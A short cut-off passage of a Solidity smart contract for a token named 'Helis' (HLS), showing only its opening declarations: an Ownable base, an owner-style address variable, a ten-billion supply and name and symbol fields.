...
contract HLSTOKEN is Ownable {
    address public csszae42;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "Helis";
    string private _cctokensymbol = "HLS";
